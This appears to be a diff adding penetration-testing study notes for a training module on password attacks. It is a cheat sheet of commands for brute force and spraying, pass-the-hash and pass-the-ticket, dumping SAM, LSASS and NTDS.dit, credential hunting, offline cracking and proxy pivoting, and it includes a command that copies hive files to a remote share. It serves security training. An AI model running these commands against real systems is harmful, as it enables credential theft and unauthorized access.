@@ -1,0 +1,150 @@
+# Password Attacks
+
+## 🎯 Main Idea
+- Comprehensive look at obtaining, cracking, and reusing credentials across Windows and Linux.
+- Covers remote (online) brute force/spraying, offline hash cracking, local credential dumping, credential hunting, and credential-reuse attacks (PtH / PtT / Pass-the-Certificate).
+- Goal: turn weak or exposed credentials into authenticated access and lateral movement.
+
+## 💥 Attack / Exploit Vectors
+### Connecting to Targets
+- Authenticated access methods used throughout the module.
+- **Commands**
+  - `xfreerdp /v:<ip> /u:htb-student /p:HTB_@cademy_stdnt!` — RDP connection to a Windows target.
+  - `evil-winrm -i <ip> -u user -p password` — PowerShell session over WinRM.
+  - `ssh user@<ip>` — SSH connection.
+  - `smbclient -U user \\\\<ip>\\SHARENAME` — Connect to an SMB share.
+  - `python3 smbserver.py -smb2support CompData /home/<user>/Documents/` — Host an SMB share for file transfer.
+
+### Custom Wordlists & Password Mutations
+- Build targeted wordlists (site keywords, username permutations) and apply rules for realistic variations.
+- **Commands**
+  - `cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist` — Generate wordlist from a website.
+  - `hashcat --force password.list -r custom.rule --stdout > mut_password.list` — Rule-based mutated wordlist.
+  - `./username-anarchy -i /path/to/names.txt` — Generate candidate usernames from names.
+  - `curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "\." | tee -a compressed_ext.txt` — Build a file-extension list for password hunting.
+
+### Remote (Online) Password Attacks
+- Brute force / password spraying / credential stuffing over network services.
+- **Commands**
+  - `netexec winrm <ip> -u user.list -p password.list` — Brute force over WinRM.
+  - `netexec smb <ip> -u "user" -p "password" --shares` — Enumerate SMB shares with creds.
+  - `hydra -L user.list -P password.list <service>://<ip>` — Brute force service (user + pass lists).
+  - `hydra -l username -P password.list <service>://<ip>` — Single user, password list.
+  - `hydra -L user.list -p password <service>://<ip>` — Password spraying (one password, many users).
+  - `hydra -C <user_pass.list> ssh://<IP>` — Credential stuffing with combo list.
+
+### Pass the Hash (PtH)
+- Authenticate with an NTLM hash instead of a plaintext password.
+- **Commands**
+  - `evil-winrm -i <ip> -u Administrator -H "<passwordhash>"` — PtH over WinRM.
+  - `netexec smb <ip> --local-auth -u <user> -p <pass> --sam` — Dump SAM hashes over the network.
+  - `netexec smb <ip> --local-auth -u <user> -p <pass> --lsa` — Dump LSA secrets (possible clear-text).
+  - `netexec smb <ip> -u <user> -p <pass> --ntds` — Dump NTDS hashes over the network.
+- Tools: Mimikatz `sekurlsa::pth`, Invoke-TheHash, Impacket psexec/wmiexec, netexec `-H`, `xfreerdp /pth` (needs Restricted Admin Mode).
+
+### Pass the Ticket (PtT) — Windows
+- Steal or forge Kerberos tickets (TGT/TGS) and inject them to authenticate without a password.
+- Harvest tickets with Mimikatz `sekurlsa::tickets /export` (.kirbi) or Rubeus `dump`.
+- OverPass-the-Hash / Pass-the-Key: turn an NTLM/AES key into a TGT (Mimikatz `sekurlsa::ekeys` + `sekurlsa::pth`, or Rubeus `asktgt`).
+- Inject with Rubeus `ptt` / Mimikatz `kerberos::ptt`, then use PowerShell Remoting (`Enter-PSSession`).
+
+### Pass the Ticket (PtT) — Linux
+- Abuse Kerberos ccache files (`/tmp`, `KRB5CCNAME`) and keytab files (`/etc/krb5.keytab`).
+- Extract hashes from keytabs with KeyTabExtract; impersonate via `KRB5CCNAME`; convert with `impacket-ticketConverter`.
+- Tools: kinit/klist, Linikatz, Impacket/Evil-WinRM with `-k`; identify domain join with `realm list`, SSSD/winbind.
+
+### Pass the Certificate
+- Use X.509 certificates to obtain Kerberos TGTs via PKINIT (useful when NTLM/passwords are unavailable).
+- AD CS ESC8: NTLM relay (`impacket-ntlmrelayx --adcs`) → cert for DC → `gettgtpkinit.py` → TGT → DCSync.
+- Shadow Credentials: abuse `msDS-KeyCredentialLink` with pywhisker → PFX → TGT.
+- Tools: Certipy, PKINITtools, pywhisker, PassTheCert, BloodHound.
+
+### Credential Hunting in Network Traffic
+- Extract creds from packet captures.
+- **Commands**
+  - `./Pcredz -f demo.pcapng -t -v` — Extract credentials from a packet capture.
+
+### Attacking SAM, SYSTEM & SECURITY (Windows local)
+- Dump local account hashes and LSA secrets from registry hives.
+- **Commands**
+  - `reg.exe save hklm\sam C:\sam.save` — Save a registry hive copy (also security/system).
+  - `move sam.save \\<ip>\NameofFileShare` — Exfiltrate hive copies over a share.
+  - `python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL` — Dump hashes from saved hives.
+
+### Attacking LSASS
+- Dump LSASS process memory to extract credentials/hashes.
+- **Commands**
+  - `Get-Process lsass` — Locate the LSASS process.
+  - `rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full` — Create an LSASS memory dump.
+  - `pypykatz lsa minidump /path/to/lsassdumpfile` — Parse the dump for credentials.
+
+### Attacking Active Directory & NTDS.dit
+- Capture the domain credential store via volume shadow copy.
+- **Commands**
+  - `vssadmin CREATE SHADOW /For=C:` — Create a volume shadow copy.
+  - `cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit` — Copy NTDS.dit from shadow copy.
+
+### Attacking Windows Credential Manager
+- Recover and reuse credentials stored in the current user profile.
+- **Commands**
+  - `rundll32 keymgr.dll,KRShowKeyMgr` — Open Credential Manager backup/restore.
+  - `cmdkey /list` — Enumerate stored credentials.
+  - `runas /savecred /user:<username> cmd` — Run as a stored user without the password.
+
+### Credential Hunting in Windows / Network Shares
+- Search filesystem and shares for passwords and secrets.
+- **Commands**
+  - `tasklist /svc` — List running processes.
+  - `findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml` — Search files for "password".
+  - `snaffler.exe -s` — Search network shares for interesting files/credentials.
+  - `Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public` — Hunt SMB shares and save results.
+
+### Credential Hunting in Linux
+- Search config/script/db files, cron, SSH keys, bash history, and browser stores.
+- **Commands**
+  - `for l in $(echo ".conf .config .cnf");do ... find / -name *$l ...;done` — Find config files.
+  - `for i in $(find / -name *.cnf ...);do grep "user|password|pass" $i ...;done` — Find creds in config files.
+  - `cat /etc/crontab` / `ls -la /etc/cron.*/` — Inspect cron jobs for creds.
+  - `grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"` — Find SSH private keys.
+  - `tail -n5 /home/*/.bash*` — Search bash history.
+  - `python3 mimipenguin.py` / `bash mimipenguin.sh` — Dump cleartext creds from memory.
+  - `python2.7 lazagne.py all` / `python3 lazagne.py browsers` — Recover stored creds / browser creds.
+  - `cat .mozilla/firefox/*.default-release/logins.json | jq .` + `python3.9 firefox_decrypt.py` — Recover/decrypt Firefox creds.
+
+### Cracking Passwords (offline)
+- Crack recovered hashes with Hashcat / John; crack protected files and archives.
+- **Commands**
+  - `hashcat -m 1000 dumpedhashes.txt /usr/share/wordlists/rockyou.txt` — Crack NTLM hashes.
+  - `hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked` — Crack Linux sha512crypt.
+  - `hashcat -m 500 -a 0 md5-hashes.list rockyou.txt` — Crack md5crypt.
+  - `unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes` — Combine passwd + shadow.
+  - `python3 ssh2john.py SSH.private > ssh.hash` + `john ssh.hash --show` — Crack SSH key passphrase.
+  - `office2john.py Protected.docx > protected-docx.hash` + `john --wordlist=rockyou.txt protected-docx.hash` — Crack Office docs.
+  - `pdf2john.pl PDF.pdf > pdf.hash` + `john --wordlist=rockyou.txt pdf.hash` — Crack PDF.
+  - `zip2john ZIP.zip > zip.hash` + `john --wordlist=rockyou.txt zip.hash` — Crack ZIP.
+  - `bitlocker2john -i Backup.vhd > backup.hashes` + `hashcat -m 22100 backup.hash rockyou.txt -o backup.cracked` — Crack BitLocker.
+  - `file GZIP.gzip` + `for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null | tar xz;done` — Brute force encrypted archive.
+
+### Pivoting with Captured Creds
+- Use SSH SOCKS proxy + proxychains to reach internal hosts with recovered credentials.
+- **Commands**
+  - `ssh -D 9050 user@<DMZ01>` — SOCKS proxy over SSH through a compromised host.
+  - `sudo vim /etc/proxychains.conf` — Ensure `socks4 127.0.0.1 9050` under `[ProxyList]`.
+  - `sudo proxychains -q nmap -sT -Pn 172.16.119.13 --open` — Internal TCP scan via proxy (`-sT` required).
+  - `proxychains xfreerdp /v:<ip> /u:htb-student /p:HTB_@cademy_stdnt!` — RDP through the proxy.
+
+## 🛠️ Key Tools & Concepts
+- Hydra / NetExec (CrackMapExec) — Online brute force, spraying, stuffing, remote dumping.
+- Hashcat / John the Ripper — Offline hash cracking (modes/rules).
+- Impacket secretsdump / pypykatz / mimikatz — Hash and LSASS/LSA extraction.
+- Mimipenguin / LaZagne / firefox_decrypt — Linux + browser credential recovery.
+- Snaffler / Invoke-HuntSMBShares / Pcredz — Share and traffic credential hunting.
+- CeWL / username-anarchy / Hashcat rules — Targeted wordlist and username generation.
+- NTLM hash, PtH, Kerberos ticket (PtT), certificate (PKINIT) — Credential-reuse primitives.
+- SAM/SYSTEM/SECURITY hives, LSASS, NTDS.dit — Windows credential stores.
+
+## 🛡️ Mitigations
+- Enforce strong password policies (length, complexity, rotation, lockout) to defeat spraying/brute force.
+- Use password managers and unique credentials to prevent reuse and stuffing.
+- Protect LSASS (Credential Guard, PPL) and restrict local admin to limit dumping and PtH.
+- Disable/limit cached credentials and audit stored Credential Manager / config-file secrets.
